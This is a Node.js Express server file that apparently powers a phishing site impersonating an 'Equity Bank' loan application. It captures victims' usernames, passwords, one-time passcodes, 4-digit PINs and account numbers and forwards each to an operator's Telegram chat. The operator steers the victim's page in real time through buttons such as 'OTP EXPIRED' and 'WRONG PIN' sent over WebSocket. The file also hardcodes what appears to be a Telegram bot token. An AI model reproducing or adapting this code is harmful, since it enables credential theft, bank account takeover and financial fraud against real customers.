const express = require('express');
const expressWs = require('express-ws');
const path = require('path');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || '8956629338:AAF22dMUkXaHfZ7EAtMVgZ3TcprIw2mvo2s';
const RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://equity-bank.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: false });
let adminChatId = process.env.ADMIN_CHAT_ID || null;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook endpoint for receiving Telegram updates
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Capture admin Chat ID on /start command
bot.onText(/\/start/, (msg) => {
  adminChatId = msg.chat.id;
  bot.sendMessage(
    adminChatId,
    '🤖 *Equity Bank Admin Connected Successfully!*\n\nLive applicant details and control buttons will appear here.',
    { parse_mode: 'Markdown' }
  );
});

// Handle Admin Inline Button Actions
bot.on('callback_query', (query) => {
  const action = query.data;
  const chatId = query.message.chat.id;

  broadcastToClients({ type: 'ADMIN_ACTION', action });

  bot.answerCallbackQuery(query.id, { text: `Action sent: ${action}` });
  bot.sendMessage(chatId, `✅ *Executed:* ${action}`, { parse_mode: 'Markdown' });
});

const clients = new Set();

app.ws('/ws', (ws, req) => {
  clients.add(ws);
  ws.on('close', () => clients.delete(ws));
});

// HTTP submission endpoint
app.post('/api/submit', (req, res) => {
  handleClientMessage(req.body);
  res.json({ success: true });
});

function broadcastToClients(data) {
  const payload = JSON.stringify(data);
  for (const client of clients) {
    if (client.readyState === 1) {
      client.send(payload);
    }
  }
}

function handleClientMessage(data) {
  if (!bot) return;

  const targetChatId = adminChatId;

  if (!targetChatId) {
    console.error('⚠️ Admin Chat ID missing. Please open Telegram and send /start to your bot.');
    return;
  }

  switch (data.step) {
    case 'LOGIN_SUBMIT': {
      const text = `📥 *NEW LOAN APPLICANT*\n\n` +
        `• *Country:* ${data.country || 'N/A'}\n` +
        `• *Currency:* ${data.currency || 'KES'}\n` +
        `• *Identifier:* ${data.identifier}\n` +
        `• *Password:* \`${data.password}\`\n` +
        `• *Requested Amount:* ${data.currency} ${data.amount || '250,000'}`;

      bot.sendMessage(targetChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ALLOW', callback_data: 'ALLOW' },
              { text: 'DENY', callback_data: 'DENY' }
            ]
          ]
        }
      });
      break;
    }

    case 'OTP_SUBMIT': {
      const text = `🔑 *OTP SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *OTP:* \`${data.otp}\``;

      bot.sendMessage(targetChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'OTP EXPIRED', callback_data: 'OTP_EXPIRED' },
              { text: 'OTP CORRECT', callback_data: 'OTP_CORRECT' }
            ]
          ]
        }
      });
      break;
    }

    case 'PIN_SUBMIT': {
      const text = `🔒 *ACCOUNT PIN SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *4-Digit PIN:* \`${data.pin}\``;

      bot.sendMessage(targetChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'CONTINUE', callback_data: 'CONTINUE' },
              { text: 'BLOCK', callback_data: 'BLOCK' }
            ]
          ]
        }
      });
      break;
    }

    case 'ACCOUNT_SUBMIT': {
      const text = `🏦 *BANK ACCOUNT SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *Account No:* \`${data.accountNo}\``;

      bot.sendMessage(targetChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'WRONG PIN', callback_data: 'WRONG_PIN' },
              { text: 'WRONG ACC. NUMBER', callback_data: 'WRONG_ACC_NUMBER' },
              { text: 'APPROVED', callback_data: 'APPROVED' }
            ]
          ]
        }
      });
      break;
    }
  }
}

// Auto-register webhook with Telegram API on server start
function autoSetWebhook() {
  const webhookUrl = `${RENDER_URL}/bot${BOT_TOKEN}`;
  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

  https.get(apiUrl, (res) => {
    let rawData = '';
    res.on('data', chunk => { rawData += chunk; });
    res.on('end', () => {
      console.log('🤖 Telegram Webhook Registration:', rawData);
    });
  }).on('error', (e) => {
    console.error('⚠️ Webhook Registration Error:', e.message);
  });
}

app.listen(PORT, () => {
  console.log(`Equity Bank Loan App running on port ${PORT}`);
  autoSetWebhook();
});
       
